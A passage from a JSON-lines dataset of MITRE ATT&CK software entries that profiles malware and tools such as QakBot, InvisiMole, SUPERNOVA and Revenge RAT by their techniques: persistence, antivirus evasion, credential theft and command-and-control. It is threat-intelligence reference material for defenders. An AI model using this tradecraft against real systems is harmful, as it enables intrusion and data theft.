{"text": " [QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used primarily by financially-motivated actors since at least 2007. [QakBot](https://attack.mitre.org/software/S0650) is continuously maintained and developed and has evolved from an information stealer into a delivery agent for ransomware, most notably [ProLock](https://attack.mitre.org/software/S0654) and [Egregor](https://attack.mitre.org/software/S0554).(Citation: Trend Micro Qakbot December 2020)(Citation: Red Canary Qbot)(Citation: Kaspersky QakBot September 2021)(Citation: ATT QakBot April 2021)", "idx": "https://attack.mitre.org/software/S0650", "title": "QakBot", "entity": "QakBot", "entity_type": "software", "entity_context": ["QakBot can execute WMI queries to gather information.", "QakBot has spread through emails with malicious links.\n", "QakBot can use domain generation algorithms in C2 communication.", "QakBot can use signed loaders to evade detection.\n", "QakBot can identify whether it has been run previously on a host by checking for a specified folder.", "QakBot can RC4 encrypt strings in C2 communication.", "QakBot can Base64 encode system information sent to C2.", "QakBot can encrypt and pack malicious payloads.", "QakBot can use <code>net share</code> to identify network shares for use in lateral movement.", "QakBot can use cmd.exe to launch itself and to execute multiple C2 commands.", "QakBot can collect system information including the OS version and domain on a compromised host.", "QakBot can check the compromised host for the presence of multiple executables associated with analysis tools and halt execution if any are found.", "QakBot can delete folders and files including overwriting its executable with legitimate programs.", "QakBot has the ability to capture web session cookies.", "QakBot can use obfuscated and encoded scripts; it has also hidden code within Excel spreadsheets by turning the font color to white and splitting it across multiple cells.", "QakBot has the ability to create scheduled tasks for persistence.", "QakBot can measure the download speed on a targeted host.", "QakBot can capture keystrokes on a compromised host.", "QakBot has the ability to modify the Registry to add its binaries to the Windows Defender exclusion list.", "QakBot can use <code>netstat</code> to enumerate current network connections.", "QakBot can run <code>nltest /domain_trusts /all_trusts</code> for domain trust discovery.", "QakBot can make small changes to itself in order to change its checksum and hash value.", "The QakBot web inject module can inject Java Script into web banking pages visited by the victim.", "QakBot can use large file sizes to evade detection.", "The QakBot payload has been disguised as a PNG file. ", "QakBot can use advanced web injects to steal web banking credentials.", "QakBot has gained execution through users opening malicious attachments.", "QakBot can use <code>net config workstation</code>, <code>arp -a</code>, and <code>ipconfig /all</code> to gather network configuration information.", "QakBot can identify peripheral devices on targeted systems.", "QakBot can identify the system time on a targeted host.", "QakBot can use MSIExec to spawn multiple cmd.exe processes.", "QakBot has the ability to use HTTP and HTTPS in communication with C2 servers.", "QakBot can maintain persistence by creating an auto-run Registry key.", "QakBot can enumerate a list of installed programs.", "QakBot can use VBS to download and execute malicious files.\n", "QakBot has collected usernames and passwords from Firefox and Chrome.", "QakBot can identify the installed antivirus product on a targeted system.", "QakBot can conduct brute force attacks to capture credentials.", "QakBot has a module that can proxy C2 communications.", "QakBot has the ability to use removable drives to spread through compromised networks.", "QakBot can send stolen information to C2 nodes including passwords, accounts, and emails.", "QakBot can identify the user name on a compromised system.", "The QakBot dropper can delay dropping the payload to evade detection.", "QakBot can identify remote systems through the <code>net view</code> command.", "QakBot has gained execution through users opening malicious links.\n", "QakBot can use a variety of commands, including esentutl.exe to steal sensitive data from Internet Explorer and Microsoft Edge, to acquire information that is subsequently exfiltrated.", "QakBot can inject itself into processes including explore.exe, Iexplore.exe, and Mobsync.exe.", "QakBot has the ability to enumerate windows on a compromised host.\n", "The QakBot proxy module can encapsulate SOCKS5 protocol within its own proxy protocol.", "QakBot can use Rundll32.exe to enable C2 communication.", "QakBot has the ability use TCP to send or receive C2 packets.", "QakBot can store its configuration information in a randomly named subkey under <code>HKCU\\Software\\Microsoft</code>.", "QakBot has the ability to check running processes.", "QakBot can use process hollowing to execute its main payload.", "QakBot can move laterally using worm-like functionality through exploitation of SMB.", "QakBot can use Regsvr32 to execute malicious DLLs.", "QakBot can use <code>GetProcAddress</code> to help delete malicious strings from memory.", "QakBot can use <code>net localgroup</code> to enable discovery of local groups.", "QakBot can deobfuscate and re-assemble code strings for execution.", "QakBot has the ability to download additional components and malware.", "QakBot can target and steal locally stored emails to support thread hijacking phishing campaigns.\n", "QakBot has spread through emails with malicious attachments.", "QakBot can use PowerShell to download and execute payloads.", "QakBot has stored stolen emails and other data into new folders prior to exfiltration."], "is_subtechnique": false}
{"text": " [pwdump](https://attack.mitre.org/software/S0006) is a credential dumper. (Citation: Wikipedia pwdump)", "idx": "https://attack.mitre.org/software/S0006", "title": "pwdump", "entity": "pwdump", "entity_type": "software", "entity_context": ["pwdump can be used to dump credentials from the SAM."], "is_subtechnique": false}
{"text": " [InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been used by the InvisiMole Group since at least 2013. [InvisiMole](https://attack.mitre.org/software/S0260) has two backdoor modules called RC2FM and RC2CL that are used to perform post-exploitation activities. It has been discovered on compromised victims in the Ukraine and Russia. [Gamaredon Group](https://attack.mitre.org/groups/G0047) infrastructure has been used to download and execute [InvisiMole](https://attack.mitre.org/software/S0260) against a small number of victims.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020)", "idx": "https://attack.mitre.org/software/S0260", "title": "InvisiMole", "entity": "InvisiMole", "entity_type": "software", "entity_context": ["InvisiMole can register a Windows service named CsPower as part of its execution chain, and a Windows service named clr_optimization_v2.0.51527_X86 to achieve persistence.", "InvisiMole can collect data from the system, and can monitor changes in specified directories.", "InvisiMole has used Windows services as a way to execute its malicious payload.", "InvisiMole has a command to list account information on the victim’s machine.", "InvisiMole can use Data Protection API to encrypt its components on the victim’s computer, to evade detection, and to make sure the payload can only be decrypted and loaded on one specific compromised computer.", "InvisiMole has used rundll32.exe for execution.", "InvisiMole has executed legitimate tools in hidden windows.", "InvisiMole can replace legitimate software or documents in the compromised network with their trojanized versions, in an attempt to propagate itself within the network.", "InvisiMole can can remove all system restore points.", "InvisiMole can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.", "InvisiMole has used a custom implementation of DNS tunneling to embed C2 communications in DNS requests and replies.", "InvisiMole can gather network share information.", "InvisiMole can use winapiexec tool for indirect execution of  <code>ShellExecuteW</code> and <code>CreateProcessA</code>.", "InvisiMole can gather information on the mapped drives, OS version, computer name, DEP policy, memory size, and system volume serial number.", "InvisiMole can use the <code>ITaskService</code>, <code>ITaskDefinition</code> and <code>ITaskSettings</code> COM interfaces to schedule a task.", "InvisiMole can remotely activate the victim’s webcam to capture content.", "InvisiMole has disguised its droppers as legitimate software or documents, matching their original names and locations, and saved its files as mpr.dll in the Windows folder.", "InvisiMole can deliver trojanized versions of software and documents, relying on user execution.", "InvisiMole avoids analysis by encrypting all strings, internal files, configuration data and by using a custom executable format.", "InvisiMole can use zlib to compress and decompress data.", "InvisiMole can capture screenshots of not only the entire screen, but of each separate window open, in case they are overlapping.", "InvisiMole can function as a proxy to create a server that relays communication between the client and C&C server, or between two clients.", "InvisiMole lists local users and session information.", "InvisiMole can scan the network for open ports and vulnerable instances of RDP and SMB protocols.", "InvisiMole can obtain a list of running processes.", "InvisiMole uses WinRAR to compress data that is intended to be exfiltrated.", "InvisiMole has a command to create, set, copy, or delete a specified Registry key or value.", "InvisiMole can obtain running services on the victim.", "InvisiMole InvisiMole can identify proxy servers used by the victim and use them for C2 communication.", "InvisiMole can mimic HTTP protocol with custom HTTP “verbs” HIDE, ZVVP, and NOP.", "InvisiMole can record sound using input audio devices.", "InvisiMole can register itself for execution and persistence via the Control Panel.", "\nInvisiMole can disconnect previously connected remote drives.", "InvisiMole can upload files to the victim's machine for operations.", "InvisiMole has exploited CVE-2007-5633 vulnerability in the speedfan.sys driver to obtain kernel mode privileges.", "InvisiMole has used scheduled tasks named <code>MSST</code> and <code>\\Microsoft\\Windows\\Autochk\\Scheduled</code> to establish persistence.", "InvisiMole has undergone regular technical improvements in an attempt to evade detection.", "InvisiMole can enumerate Registry values, keys, and data.", "InvisiMole uses a variation of the XOR cipher to encrypt files before exfiltration.", "InvisiMole can enumerate windows and child windows on a compromised host.", "InvisiMole gathers information on the IP forwarding table, MAC address, configured proxy, and network SSID.", "InvisiMole uses variations of a simple XOR encryption routine for C&C communications.", "InvisiMole can place a lnk file in the Startup Folder to achieve persistence.", "InvisiMole can check for the presence of network sniffers, AV, and BitDefender firewall.", "InvisiMole uses HTTP for C2 communications.", "InvisiMole can list information about files in a directory and recently opened or used documents. InvisiMole can also search for specific files by supplied file mask.", "InvisiMole has been configured with several servers available for alternate C2 communications.", "InvisiMole uses port 80 for C2.", "InvisiMole can inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure.", "InvisiMole can collect jpeg files from connected MTP devices.", "InvisiMole can decrypt, unpack and load a DLL from its resources, or from blobs encrypted with Data Protection API, two-key triple DES, and variations of the XOR cipher.", "InvisiMole has a command to disable routing and the Firewall on the victim’s machine.", "InvisiMole has used TCP to download additional modules.", "InvisiMole can spread within a network via the BlueKeep (CVE-2019-0708) and EternalBlue (CVE-2017-0144) vulnerabilities in RDP and SMB respectively.", "InvisiMole can sort and collect specific documents as well as generate a list of all files on a newly inserted drive and store them in an encrypted file.", "InvisiMole can use a .lnk shortcut for the Control Panel to establish persistence.", "InvisiMole can use a modified base32 encoding to encode data within the subdomain of C2 requests.", "InvisiMole can inject its code into a trusted process via the APC queue.", "InvisiMole can capture keystrokes on a compromised host.", "InvisiMole determines a working directory where it stores all the gathered data about the compromised machine.", "InvisiMole can check for artifacts of VirtualBox, Virtual PC and VMware environment, and terminate itself if they are detected.", "InvisiMole can inject its backdoor as a portable executable into a target process.\t", "InvisiMole has attempted to disguise itself by registering under a seemingly legitimate service name.", "InvisiMole can use a JavaScript file as part of its execution chain.", "InvisiMole can create hidden system directories.", "InvisiMole has deleted files and directories including XML and files successfully uploaded to C2 servers.", "InvisiMole can launch a remote shell to execute commands.", "InvisiMole can use fileless UAC bypass and create an elevated COM object to escalate privileges.", "InvisiMole has installed legitimate but vulnerable Total Video Player software and wdigest.dll library drivers on compromised hosts to exploit stack overflow and input validation vulnerabilities for code execution.", "InvisiMole gathers the local system time from the victim’s machine.", "InvisiMole samples were timestomped by the authors by setting the PE timestamps to all zero values. InvisiMole also has a built-in command to modify file times.", "InvisiMole can collect information about installed software used by specific users, software executed on user login, and software executed by each system."], "is_subtechnique": false}
{"text": " [Linux Rabbit](https://attack.mitre.org/software/S0362) is malware that targeted Linux servers and IoT devices in a campaign lasting from August to October 2018. It shares code with another strain of malware known as Rabbot. The goal of the campaign was to install cryptocurrency miners onto the targeted servers and devices.(Citation: Anomali Linux Rabbit 2018)", "idx": "https://attack.mitre.org/software/S0362", "title": "Linux Rabbit", "entity": "Linux Rabbit", "entity_type": "software", "entity_context": ["Linux Rabbit sends the payload from the C2 server as an encoded URL parameter. ", "Linux Rabbit opens a socket on port 22 and if it receives a response it attempts to obtain the machine's hostname and Top-Level Domain. ", "Linux Rabbit attempts to gain access to the server via SSH.", "Linux Rabbit brute forces SSH passwords in order to attempt to gain access and install its malware onto the server. ", "Linux Rabbit maintains persistence on an infected machine through rc.local and .bashrc files. ", "Linux Rabbit checks to see if an SSH server is listening on port 22.", "Linux Rabbit acquires valid SSH accounts through brute force. "], "is_subtechnique": false}
{"text": " [BACKSPACE](https://attack.mitre.org/software/S0031) is a backdoor used by [APT30](https://attack.mitre.org/groups/G0013) that dates back to at least 2005. (Citation: FireEye APT30)", "idx": "https://attack.mitre.org/software/S0031", "title": "BACKSPACE", "entity": "BACKSPACE", "entity_type": "software", "entity_context": ["BACKSPACE uses HTTP as a transport to communicate with its command server.", "BACKSPACE is capable of enumerating and making modifications to an infected system's Registry.", "BACKSPACE attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs \"louder\" interactions with the malware.", "BACKSPACE allows adversaries to search for files.", "During its initial execution, BACKSPACE extracts operating system information from the infected host.", "BACKSPACE may collect information about running processes.", "Adversaries can direct BACKSPACE to upload files to the C2 Server.", "The \"ZJ\" variant of BACKSPACE allows \"ZJ link\" infections with Internet access to relay traffic from \"ZJ listen\" to a command server.", "BACKSPACE is capable of deleting Registry keys, sub-keys, and values on a victim system.", "BACKSPACE achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.", "Adversaries can direct BACKSPACE to execute from the command line on infected hosts, or have BACKSPACE create a reverse shell.", "The \"ZR\" variant of BACKSPACE will check to see if known host-based firewalls are installed on the infected systems. BACKSPACE will attempt to establish a C2 channel, then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed.", "Newer variants of BACKSPACE will encode C2 communications with a custom system."], "is_subtechnique": false}
{"text": " [SpicyOmelette](https://attack.mitre.org/software/S0646) is a JavaScript based remote access tool that has been used by [Cobalt Group](https://attack.mitre.org/groups/G0080) since at least 2018.(Citation: Secureworks GOLD KINGSWOOD September 2018)", "idx": "https://attack.mitre.org/software/S0646", "title": "SpicyOmelette", "entity": "SpicyOmelette", "entity_type": "software", "entity_context": ["SpicyOmelette has been executed through malicious links within spearphishing emails.", "SpicyOmelette has the ability to execute arbitrary JavaScript code on a compromised host.", "SpicyOmelette can download malicious files from threat actor controlled AWS URL's.", "SpicyOmelette can identify the system name of a compromised host.", "SpicyOmelette can enumerate running software on a targeted system.", "SpicyOmelette can check for the presence of 29 different antivirus tools.", "SpicyOmelette has collected data and other information from a compromised host.", "SpicyOmelette can identify payment systems, payment gateways, and ATM systems in compromised environments.", "SpicyOmelette has been signed with valid digital certificates.", "SpicyOmelette can identify the IP of a compromised system.", "SpicyOmelette has been distributed via emails containing a malicious link that appears to be a PDF document."], "is_subtechnique": false}
{"text": " [YAHOYAH](https://attack.mitre.org/software/S0388) is a Trojan used by [Tropic Trooper](https://attack.mitre.org/groups/G0081) as a second-stage backdoor.(Citation: TrendMicro TropicTrooper 2015)", "idx": "https://attack.mitre.org/software/S0388", "title": "YAHOYAH", "entity": "YAHOYAH", "entity_type": "software", "entity_context": ["YAHOYAH decrypts downloaded files before execution.", "YAHOYAH uses HTTP GET requests to download other files that are executed in memory.", "YAHOYAH encrypts its configuration file using a simple algorithm.", "YAHOYAH checks for the system’s Windows OS version and hostname.", "YAHOYAH checks for antimalware solution processes on the system.", "YAHOYAH uses HTTP for C2."], "is_subtechnique": false}
{"text": " [USBStealer](https://attack.mitre.org/software/S0136) is malware that has used by [APT28](https://attack.mitre.org/groups/G0007) since at least 2005 to extract information from air-gapped networks. It does not have the capability to communicate over the Internet and has been used in conjunction with [ADVSTORESHELL](https://attack.mitre.org/software/S0045). (Citation: ESET Sednit USBStealer 2014) (Citation: Kaspersky Sofacy)", "idx": "https://attack.mitre.org/software/S0136", "title": "USBStealer", "entity": "USBStealer", "entity_type": "software", "entity_context": ["USBStealer searches victim drives for files matching certain extensions (“.skr”,“.pkr” or “.key”) or names.", "USBStealer collects files matching certain criteria from the victim and stores them in a local directory for later exfiltration.", "USBStealer sets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system.", "For all non-removable drives on a victim, USBStealer executes automated collection of certain files for later exfiltration.", "USBStealer registers itself under a Registry Run key with the name \"USB Disk Security.\"", "USBStealer monitors victims for insertion of removable drives. When dropped onto a second victim, it also enumerates drives connected to the system.", "USBStealer drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system.", "USBStealer exfiltrates collected files via removable media from air-gapped victims.", "USBStealer has several commands to delete files associated with the malware from the victim.", "USBStealer automatically exfiltrates collected files via removable media when an infected device is connected to the second victim after receiving commands from the first victim.", "Most strings in USBStealer are encrypted using 3DES and XOR and reversed.", "Once a removable media device is inserted back into the first victim, USBStealer collects data from it that was exfiltrated from a second victim.", "USBStealer mimics a legitimate Russian program called USB Disk Security.", "USBStealer drops commands for a second victim onto a removable media drive inserted into the first victim, and commands are executed when the drive is inserted into the second victim."], "is_subtechnique": false}
{"text": " [EnvyScout](https://attack.mitre.org/software/S0634) is a dropper that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)", "idx": "https://attack.mitre.org/software/S0634", "title": "EnvyScout", "entity": "EnvyScout", "entity_type": "software", "entity_context": ["EnvyScout has the ability to proxy execution of malicious files with Rundll32.", "EnvyScout can use protocol handlers to coax the operating system to send NTLMv2 authentication responses to attacker-controlled infrastructure.", "EnvyScout contains JavaScript code that can extract an encoded blob from its HTML body and write it to disk.", "EnvyScout can call <code>window.location.pathname</code> to ensure that embedded files are being executed from the C: drive, and will terminate if they are not.", "EnvyScout can collect sensitive NTLM material from a compromised host.", "EnvyScout can use cmd.exe to execute malicious files on compromised hosts.", "EnvyScout has been executed through malicious files attached to e-mails.", "EnvyScout has used folder icons for malicious files to lure victims into opening them.", "EnvyScout can deobfuscate and write malicious ISO files to disk.", "EnvyScout can write files to disk with JavaScript using a modified version of the open-source tool FileSaver.", "EnvyScout has been distributed via spearphishing as an email attachment.", "EnvyScout can determine whether the ISO payload was received by a Windows or iOS device.", "EnvyScout can use hidden directories and files to hide malicious executables.", "EnvyScout can Base64 encode payloads."], "is_subtechnique": false}
{"text": " [Reg](https://attack.mitre.org/software/S0075) is a Windows utility used to interact with the Windows Registry. It can be used at the command-line interface to query, add, modify, and remove information. (Citation: Microsoft Reg) Utilities such as [Reg](https://attack.mitre.org/software/S0075) are known to be used by persistent threats. (Citation: Windows Commands JPCERT)", "idx": "https://attack.mitre.org/software/S0075", "title": "Reg", "entity": "Reg", "entity_type": "software", "entity_context": ["Reg may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.", "Reg may be used to find credentials in the Windows Registry.", "Reg may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface."], "is_subtechnique": false}
{"text": " [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) is a remote access Trojan written in C++ that has been used by an unidentified \"sophisticated cyber actor\" since at least January 2017.(Citation: CISA MAR SLOTHFULMEDIA October 2020)(Citation: Costin Raiu IAmTheKing October 2020) It has been used to target government organizations, defense contractors, universities, and energy companies in Russia, India, Kazakhstan, Kyrgyzstan, Malaysia, Ukraine, and Eastern Europe.(Citation: USCYBERCOM SLOTHFULMEDIA October 2020)(Citation: Kaspersky IAmTheKing October 2020) In October 2020, Kaspersky Labs assessed [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) is part of an activity cluster it refers to as \"IAmTheKing\".(Citation: Kaspersky IAmTheKing October 2020) ESET also noted code similarity between [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) and droppers used by a group it refers to as \"PowerPool\".(Citation: ESET PowerPool Code October 2020)", "idx": "https://attack.mitre.org/software/S0533", "title": "SLOTHFULMEDIA", "entity": "SLOTHFULMEDIA", "entity_type": "software", "entity_context": ["SLOTHFULMEDIA has the capability to enumerate services.", "SLOTHFULMEDIA has mimicked the names of known executables, such as mediaplayer.exe.", "SLOTHFULMEDIA has downloaded files onto a victim machine.", "SLOTHFULMEDIA has been created with a hidden attribute to insure it's not visible to the victim.", "SLOTHFULMEDIA has named a service it establishes on victim machines as \"TaskFrame\" to hide its malicious purpose. ", "SLOTHFULMEDIA can inject into running processes on a compromised host.", "SLOTHFULMEDIA can add, modify, and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap</code> registry.", "SLOTHFULMEDIA can enumerate open ports on a victim machine.", "SLOTHFULMEDIA has taken a screenshot of a victim's desktop, named it \"Filter3.jpg\", and stored it in the local directory.", "SLOTHFULMEDIA has hashed a string containing system information prior to exfiltration via POST requests.", "SLOTHFULMEDIA has sent system information to a C2 server via HTTP and HTTPS POST requests.", "SLOTHFULMEDIA has created a service on victim machines named \"TaskFrame\" to establish persistence.", "SLOTHFULMEDIA has the capability to start services.", "SLOTHFULMEDIA can open a command line to execute commands.", "SLOTHFULMEDIA has a keylogging capability.", "SLOTHFULMEDIA can enumerate files and directories.", "SLOTHFULMEDIA has deleted itself and the 'index.dat' file on a compromised machine to remove recent Internet history from the system.", "SLOTHFULMEDIA has uploaded files and information from victim machines.", "SLOTHFULMEDIA has used HTTP and HTTPS for C2 communications.", "SLOTHFULMEDIA has enumerated processes by ID, name, or privileges. ", "SLOTHFULMEDIA has collected the username from a victim machine.", "SLOTHFULMEDIA has the capability to stop processes and services.", "SLOTHFULMEDIA has collected system name, OS version, adapter information, memory usage, and disk information from a victim machine."], "is_subtechnique": false}
{"text": " [NBTscan](https://attack.mitre.org/software/S0590) is an open source tool that has been used by state groups to conduct internal reconnaissance within a compromised network.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003)(Citation: Symantec Waterbug Jun 2019)(Citation: FireEye APT39 Jan 2019)", "idx": "https://attack.mitre.org/software/S0590", "title": "NBTscan", "entity": "NBTscan", "entity_type": "software", "entity_context": ["NBTscan can be used to collect MAC addresses.\t", "NBTscan can be used to scan IP networks.", "NBTscan can list NetBIOS computer names.\t", "NBTscan can list active users on the system.\t", "NBTscan can dump and print whole packet content.\t"], "is_subtechnique": false}
{"text": " [Ixeshe](https://attack.mitre.org/software/S0015) is a malware family that has been used since at least 2009 against targets in East Asia. (Citation: Moran 2013)", "idx": "https://attack.mitre.org/software/S0015", "title": "Ixeshe", "entity": "Ixeshe", "entity_type": "software", "entity_context": ["Ixeshe uses HTTP for command and control.", "Ixeshe uses custom Base64 encoding schemes to obfuscate command and control traffic in the message body of HTTP requests.", "Ixeshe sets its own executable file's attributes to hidden.", "Ixeshe can list running processes.", "Ixeshe can list file and directory information.", "Ixeshe enumerates the IP address, network proxy settings, and domain name from a victim's system.", "Ixeshe collects the username from the victim’s machine.", "Ixeshe can download and execute additional files.", "Ixeshe can achieve persistence by adding itself to the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.", "Ixeshe can collect data from a local system.", "Ixeshe collects the computer name of the victim's system during the initial infection.", "Ixeshe has a command to delete a file from the machine.", "Ixeshe has used TCP port 443 for C2.", "Ixeshe has used registry values and file names associated with Adobe software, such as AcroRd32.exe.", "Ixeshe can list running services.", "Ixeshe is capable of executing commands via cmd."], "is_subtechnique": false}
{"text": " [Sakula](https://attack.mitre.org/software/S0074) is a remote access tool (RAT) that first surfaced in 2012 and was used in intrusions throughout 2015. (Citation: Dell Sakula)", "idx": "https://attack.mitre.org/software/S0074", "title": "Sakula", "entity": "Sakula", "entity_type": "software", "entity_context": ["Sakula uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files.", "Sakula contains UAC bypass code for both 32- and 64-bit systems.", "Sakula calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup. Sakula also has the capability to invoke a reverse shell.", "Some Sakula samples use cmd.exe to delete temporary files.", "Sakula calls cmd.exe to run various DLL files via rundll32.", "Most Sakula samples maintain persistence by setting the Registry Run key <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> in the HKLM or HKCU hive, with the Registry value and file name varying by sample.", "Sakula uses single-byte XOR obfuscation to obfuscate many of its files.", "Sakula uses HTTP for C2.", "Sakula has the capability to download files.", "Sakula encodes C2 traffic with single-byte XOR keys.", "Some Sakula samples install themselves as services for persistence by calling WinExec with the <code>net start</code> argument."], "is_subtechnique": false}
{"text": " [HyperStack](https://attack.mitre.org/software/S0537) is a RPC-based backdoor used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2018. [HyperStack](https://attack.mitre.org/software/S0537) has similarities to other backdoors used by [Turla](https://attack.mitre.org/groups/G0010) including [Carbon](https://attack.mitre.org/software/S0335).(Citation: Accenture HyperStack October 2020)", "idx": "https://attack.mitre.org/software/S0537", "title": "HyperStack", "entity": "HyperStack", "entity_type": "software", "entity_context": ["HyperStack can connect to the IPC$ share on remote machines.", "HyperStack can use Windows API's <code>ConnectNamedPipe</code> and <code>WNetAddConnection2</code> to detect incoming connections and connect to remote shares.", "HyperStack can use default credentials to connect to IPC$ shares on remote machines.", "HyperStack has used RSA encryption for C2 communications.", "HyperStack can enumerate all account names on a remote share.", "HyperStack can add the name of its communication pipe to <code>HKLM\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\lanmanserver\\\\parameters\\NullSessionPipes</code>."], "is_subtechnique": false}
{"text": " [SUPERNOVA](https://attack.mitre.org/software/S0578) is an in-memory web shell written in .NET C#. It was discovered in November 2020 during the investigation of [APT29](https://attack.mitre.org/groups/G0016)'s SolarWinds cyber operation but determined to be unrelated. Subsequent analysis suggests [SUPERNOVA](https://attack.mitre.org/software/S0578) may have been used by the China-based threat group SPIRAL.(Citation: Guidepoint SUPERNOVA Dec 2020)(Citation: Unit42 SUPERNOVA Dec 2020)(Citation: SolarWinds Advisory Dec 2020)(Citation: CISA Supernova Jan 2021)(Citation: Microsoft Analyzing Solorigate Dec 2020)", "idx": "https://attack.mitre.org/software/S0578", "title": "SUPERNOVA", "entity": "SUPERNOVA", "entity_type": "software", "entity_context": ["SUPERNOVA contained Base64-encoded strings.", "SUPERNOVA has masqueraded as a legitimate SolarWinds DLL.", "SUPERNOVA was installed via exploitation of a SolarWinds Orion API authentication bypass vulnerability (CVE-2020-10148).", "SUPERNOVA had to receive an HTTP GET request containing a specific set of parameters in order to execute.", "SUPERNOVA is a Web shell."], "is_subtechnique": false}
{"text": " [Systeminfo](https://attack.mitre.org/software/S0096) is a Windows utility that can be used to gather detailed information about a computer. (Citation: TechNet Systeminfo)", "idx": "https://attack.mitre.org/software/S0096", "title": "Systeminfo", "entity": "Systeminfo", "entity_type": "software", "entity_context": ["Systeminfo can be used to gather information about the operating system."], "is_subtechnique": false}
{"text": " [Revenge RAT](https://attack.mitre.org/software/S0379) is a freely available remote access tool written in .NET (C#).(Citation: Cylance Shaheen Nov 2018)(Citation: Cofense RevengeRAT Feb 2019)", "idx": "https://attack.mitre.org/software/S0379", "title": "Revenge RAT", "entity": "Revenge RAT", "entity_type": "software", "entity_context": ["Revenge RAT has the ability to access the webcam.", "Revenge RAT has the ability to upload and download files.", "Revenge RAT uses cmd.exe to execute commands and run scripts on the victim's machine.", "Revenge RAT has a plugin for microphone interception.", "Revenge RAT uses Base64 to encode information sent to the C2 server.", "Revenge RAT uses the PowerShell command <code>Reflection.Assembly</code> to load itself into memory to aid in execution.", "Revenge RAT creates a Registry key at <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> to survive a system reboot.", "Revenge RAT has a plugin for credential harvesting.", "Revenge RAT uses the Forfiles utility to execute commands on the system.", "Revenge RAT uses mshta.exe to run malicious scripts on the system.", "Revenge RAT collects the IP address and MAC address from the system.", "Revenge RAT schedules tasks to run malicious scripts at different intervals.", "Revenge RAT used blogpost.com as its primary command and control server during a campaign.", "Revenge RAT gathers the username from the system.", "Revenge RAT has a plugin for keylogging.", "Revenge RAT collects the CPU information, OS information, and system language.", "Revenge RAT has a plugin to perform RDP access.\n", "Revenge RAT has a plugin for screen capture."], "is_subtechnique": false}
{"text": " [Ramsay](https://attack.mitre.org/software/S0458) is an information stealing malware framework designed to collect and exfiltrate sensitive documents, including from air-gapped systems. Researchers have identified overlaps between [Ramsay](https://attack.mitre.org/software/S0458) and the [Darkhotel](https://attack.mitre.org/groups/G0012)-associated Retro malware.(Citation: Eset Ramsay May 2020)(Citation: Antiy CERT Ramsay April 2020)", "idx": "https://attack.mitre.org/software/S0458", "title": "Ramsay", "entity": "Ramsay", "entity_type": "software", "entity_context": ["Ramsay can insert itself into the address space of other applications using the AppInit DLL Registry key.\t", "Ramsay can spread itself by infecting other portable executable files on removable drives.\t", "Ramsay has PE data embedded within JPEG files contained within Word documents.", "Ramsay can detect system information--including disk names, total space, and remaining space--to create a hardware profile GUID which acts as a system identifier for operators.\t", "Ramsay can use ipconfig and Arp to collect network configuration information, including routing information and ARP tables.", "Ramsay has been executed through malicious e-mail attachments.", "Ramsay can conduct an initial scan for Microsoft Word documents on the local system, removable media, and connected network drives, before tagging and collecting them. It can continue tagging documents to collect with follow up scans.\t", "Ramsay can take screenshots every 30 seconds as well as when an external removable storage device is connected.", "Ramsay can use <code>ImprovedReflectiveDLLInjection</code> to deploy components. ", "Ramsay has been embedded in documents exploiting CVE-2017-0199, CVE-2017-11882, and CVE-2017-8570.", "Ramsay has created Registry Run keys to establish persistence.", "Ramsay has masqueraded as a JPG image file.", "Ramsay can stage data prior to exfiltration in <code>%APPDATA%\\Microsoft\\UserSetting</code> and <code>%APPDATA%\\Microsoft\\UserSetting\\MediaCache</code>.\t", "Ramsay has included a rootkit to evade defenses.\t", "Ramsay has used base64 to encode its C2 traffic.", "Ramsay can use Windows API functions such as <code>WriteFile</code>, <code>CloseHandle</code>, and <code>GetCurrentHwProfile</code> during its collection and file storage operations. Ramsay can execute its embedded components via <code>CreateProcessA</code> and <code>ShellExecute</code>.", "Ramsay can collect data from removable media and stage it for exfiltration.\t", "Ramsay has been delivered using OLE objects in malicious documents.\t", "Ramsay has base64-encoded its portable executable and hidden itself under a JPG header. Ramsay can also embed information within document footers.\t", "Ramsay can collect data from network drives and stage it for exfiltration.\t", "Ramsay can spread itself by infecting other portable executable files on networks shared drives.\t", "Ramsay can collect Microsoft Word documents from the target's file system, as well as <code>.txt</code>, <code>.doc</code>, and <code>.xls</code> files from the Internet Explorer cache.\t", "Ramsay can use <code>netstat</code> to enumerate network connections.", "Ramsay can collect directory and file lists.\t", "Ramsay can gather a list of running processes by using Tasklist.", "Ramsay has masqueraded as a 7zip installer.\t", "Ramsay can scan for systems that are vulnerable to the EternalBlue exploit.\t", "Ramsay can scan for network drives which may contain documents for collection.\t", "Ramsay can scan for removable media which may contain documents for collection.\t", "Ramsay has used HTTP for C2.", "Ramsay can hijack outdated Windows application dependencies with malicious versions of its own DLL payload.\t", "Ramsay can use UACMe for privilege escalation.\t", "Ramsay has been distributed through spearphishing emails with 